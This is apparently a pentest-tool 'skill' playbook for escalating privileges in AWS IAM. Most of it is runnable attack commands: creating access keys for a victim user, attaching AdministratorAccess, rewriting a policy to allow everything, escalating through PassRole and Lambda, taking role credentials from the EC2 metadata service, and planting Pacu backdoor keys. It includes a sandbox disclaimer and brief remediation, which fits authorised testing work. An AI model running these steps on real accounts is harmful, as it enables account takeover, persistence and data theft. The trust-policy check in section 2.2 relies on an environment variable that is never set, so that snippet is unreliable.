# AWS IAM Penetration Testing — Skill Playbook

**Mitre ATT&CK ID:** T1526 (Cloud Service Discovery), T1078 (Valid Accounts), T1530 (Data from Cloud Storage), T1136 (Create Account)
**OWASP Mapping:** A01:2021 – Broken Access Control, A05:2021 – Security Misconfiguration
**Severity:** Critical / High
**Last Updated:** 2026-08-02

---

## Metadata

```yaml
skill_id: aws-iam-pentest-v2
category: aws-iam
cloud_provider: aws
author: HiveBreach
mitre_attack_id:
  - T1526
  - T1078
  - T1530
  - T1136
  - T1068
owasp_mapping:
  - A01:2021-Broken Access Control
  - A05:2021-Security Misconfiguration
tags:
  - aws
  - iam
  - privilege-escalation
  - cloud-security
  - s3
  - lambda
  - ec2-metadata
tools:
  - aws-cli
  - prowler
  - pacu
  - scoutsuite
  - cloudsplaining
  - enumerate-iam
  - pmapper
verification_required: sandbox
```

---

## 1. Detection

### 1.1 Identity Confirmation and IAM Enumeration

```bash
aws sts get-caller-identity
aws iam list-users --query "Users[*].[UserName,Arn,CreateDate]" --output table
aws iam list-roles --query "Roles[*].[RoleName,Arn]" --output table
aws iam list-policies --scope All --only-attached --output json
aws iam get-account-authorization-details --output json > /tmp/authz.json
```

### 1.2 Enumerate Effective Permissions

```bash
aws iam list-attached-user-policies --user-name <user>
aws iam list-user-policies --user-name <user>
aws iam list-groups-for-user --user-name <user>
aws iam get-role --role-name <role> --query 'Role.AssumeRolePolicyDocument'

aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::<acct>:user/<user> \
  --action-names iam:CreateUser iam:AttachUserPolicy iam:PassRole \
    lambda:CreateFunction ec2:RunInstances sts:AssumeRole \
  --query 'EvaluationResults[*].[EvalActionName,EvalDecision]' --output table
```

### 1.3 Privilege Escalation Primitives to Hunt For

| Permission | Escalation Potential |
|---|---|
| `iam:CreateAccessKey` | Create keys for another user -> assume that identity |
| `iam:AttachUserPolicy` / `iam:AttachGroupPolicy` | Attach `AdministratorAccess` to a controlled principal |
| `iam:CreatePolicyVersion` + `iam:SetDefaultPolicyVersion` | Rewrite any customer-managed policy |
| `iam:UpdateRoleAssumeRolePolicy` | Set role trust to attacker account |
| `iam:PassRole` + `ec2:RunInstances` / `lambda:CreateFunction` | Run workload as a privileged role |
| `sts:AssumeRole` with wildcard role ARN | Assume any role |
| `s3:PutObject` on a dependency bucket | Poison a role's bootstrap object |

---

## 2. Confirmation

### 2.1 Verify Permissions in the IAM Policy Simulator

```bash
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::<acct>:role/<role> \
  --action-names iam:* ec2:* lambda:* sts:AssumeRole \
  --query 'EvaluationResults[*].[EvalActionName,EvalDecision]' --output table | grep -i allow
```

### 2.2 Cross-Account Trust and Confused Deputy Check

```bash
for r in $(aws iam list-roles --query 'Roles[*].RoleName' --output text); do
  aws iam get-role --role-name "$r" --query 'Role.AssumeRolePolicyDocument' --output json 2>/dev/null | \
    python3 -c "import json,sys,os
d=json.load(sys.stdin)
for s in d.get('Statement',[]):
    ap=s.get('Principal',{}).get('AWS','')
    if '*' in str(ap) or 'root' in str(ap): print(os.environ['ROLE'],ap)"
done
```

### 2.3 EC2 Metadata Service Reachability

```bash
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

---

## 3. Exploitation

### 3.1 iam:CreateAccessKey

```bash
aws iam create-access-key --user-name victim --output json
export AWS_ACCESS_KEY_ID=AKIA... AWS_SECRET_ACCESS_KEY=...
aws sts get-caller-identity
```

### 3.2 iam:AttachUserPolicy

```bash
aws iam attach-user-policy --user-name <user> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

### 3.3 iam:PassRole + lambda:CreateFunction (Lambda Role Escalation)

```bash
aws iam get-role --role-name <priv-role> --query 'Role.Arn' --output text
cat > payload.py << 'EOF'
import boto3, json
def handler(event, context):
    return json.dumps(boto3.client("sts").get_caller_identity())
EOF
zip -q payload.zip payload.py
aws lambda create-function --function-name esc-<id> --runtime python3.12 \
  --role <priv-role-arn> --handler payload.handler --zip-file fileb://payload.zip
aws lambda invoke --function-name esc-<id> --payload '{}' out.json && cat out.json
```

### 3.4 iam:CreatePolicyVersion -> Admin Policy

```bash
aws iam create-policy-version \
  --policy-arn <policy-arn> \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default
```

### 3.5 S3 Bucket Misconfiguration (public read/write/list)

```bash
for b in $(aws s3api list-buckets --query 'Buckets[*].Name' --output text); do
  aws s3api get-bucket-policy --bucket "$b" --output json 2>/dev/null | \
    python3 -c "import json,sys; d=json.load(sys.stdin)
for s in d.get('Statement',[]):
    if '*' in str(s.get('Principal',{})): print('PUBLIC',s.get('Effect'),s.get('Action'))"
done
aws s3 ls s3://<bucket>/ --no-sign-request
aws s3 cp s3://<bucket>/file.txt . --no-sign-request
```

### 3.6 KMS and CloudTrail Logging Gaps

```bash
aws kms list-keys --query 'Keys[*].KeyId' --output text | while read k; do
  aws kms get-key-policy --key-id "$k" --policy-name default --output json 2>/dev/null
done
aws cloudtrail list-trails --query 'TrailList[*].[Name,IsLogging]' --output table
```

---

## 4. Tool-Guidance

### 4.1 Prowler

```bash
prowler aws --services iam s3 kms cloudtrail -M csv -o ./prowler-out
prowler aws --checks s3_bucket_public_access iam_policy_allows_*_resources
```

### 4.2 Pacu

```bash
pacu
Pacu > set_keys
Pacu > run iam__enum_users_roles_policies_groups
Pacu > run iam__privesc_scan
Pacu > run iam__backdoor_users_keys
Pacu > run s3__enum
```

### 4.3 Cloudsplaining + Principal Mapper + Enumerate-IAM

```bash
cloudsplaining scan --input-file /tmp/authz.json --output /tmp/csplaining
pmapper graph create --account <acct>
pmapper query 'who can do iam:CreateAccessKey with arn:aws:iam::*:user/*'
python3 enumerate-iam.py --access-key AKIA... --secret-key ...
```

---

## 5. PoC Generation

### PoC Template

```markdown
## AWS IAM Finding — [FINDING_ID]

**Resource:** arn:aws:iam::ACCOUNT:user/<user> | role/<role>
**Permission:** iam:PassRole, lambda:CreateFunction
**Chain:** Compromised user -> PassRole(AdminRole) -> Lambda execute -> admin session

### Proof
1. `aws sts get-caller-identity` with stolen credentials
2. `aws lambda create-function --role arn:...:role/AdminRole ...`
3. `aws lambda invoke` returned caller identity of AdminRole
4. `aws s3 ls` confirmed admin-level data access

### Impact
- Full account compromise / data exfiltration (T1530)
- Persistent backdoor via access key or Lambda (T1136)

### Remediation
- Restrict iam:PassRole to explicit role ARNs and aws:PassedToService
- Apply permission boundaries and SCP guardrails
```

---

## 6. Verification

- [ ] Escalation executed in isolated AWS sandbox account only
- [ ] `aws iam simulate-principal-policy` confirms each claimed permission
- [ ] PoC independently replayed with a second tool (Pacu + Cloudsplaining cross-check)
- [ ] Every finding includes exact policy ARN and statement Sid
- [ ] CloudTrail reviewed to confirm which actions were attributed to the test principal

---

## 7. CheatSheet

```bash
aws sts get-caller-identity
aws iam get-account-authorization-details > authz.json
cloudsplaining scan --input-file authz.json --output out
pacu > run iam__privesc_scan
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
aws s3 ls --no-sign-request
```

| Permission seen | Try |
|---|---|
| `iam:CreateAccessKey` | `aws iam create-access-key --user-name victim` |
| `iam:PassRole` | Lambda/EC2/ECS/CloudFormation with privileged role |
| `iam:CreatePolicyVersion` | Write `*:*` version, set-as-default |
| `sts:AssumeRole` | `aws sts assume-role --role-arn arn:...:role/<r>` |

---

## 8. Related Techniques (MITRE ATT&CK Mapping)

| Technique ID | Name | Relation |
|---|---|---|
| T1526 | Cloud Service Discovery | IAM/enumeration phase |
| T1078 | Valid Accounts | Using compromised keys |
| T1530 | Data from Cloud Storage | S3 data access after escalation |
| T1136 | Create Account | Backdoor users/roles/keys |
| T1068 | Exploitation for Privilege Escalation | Escalation chains |
| T1552.005 | Cloud Instance Metadata API | EC2 metadata theft |
| T1098.003 | Additional Cloud Credentials | Creating access keys |

---

## 9. References

- Rhino Security Labs — AWS IAM Privilege Escalation: https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
- Pacu: https://github.com/RhinoSecurityLabs/pacu
- Cloudsplaining: https://cloudsplaining.readthedocs.io/en/latest/
- Prowler: https://github.com/prowler-cloud/prowler
- ScoutSuite: https://github.com/nccgroup/ScoutSuite
- AWS IAM documentation: https://docs.aws.amazon.com/IAM/latest/UserGuide/

---

*This playbook is for authorised security testing only. All verification must occur in AWS sandbox accounts.*
